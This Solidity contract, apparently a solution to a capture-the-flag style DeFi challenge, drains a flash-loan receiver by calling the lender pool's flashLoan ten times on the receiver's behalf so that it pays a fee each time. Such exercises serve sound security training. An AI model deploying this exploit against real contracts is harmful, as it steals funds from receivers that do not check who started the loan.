// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract RektNaiveReceiver {
    constructor(address payable poolAddress, address receiver) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 1 ether);
        }
    }
}
